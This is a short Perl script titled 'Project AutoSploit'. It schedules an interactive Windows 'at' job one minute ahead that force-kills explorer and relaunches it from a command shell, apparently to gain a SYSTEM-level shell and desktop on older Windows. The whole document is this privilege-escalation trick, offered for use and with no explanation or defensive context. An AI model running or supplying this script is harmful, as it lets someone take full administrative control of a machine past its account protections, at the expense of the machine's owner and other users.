################################################
#############^Project AutoSploit^###############
################################################
########Perl translation by Matthew Jack########
#Started: 1/12/2012; Completed: 1/12/2012 02:53#

($sec, $min,$hour) = localtime(time);
$min++;
$cmd = "at $hour:$min /interactive cmd /a /k \"taskkill /f /im explorer* && explorer.exe\"";
system($cmd);
system("pause");
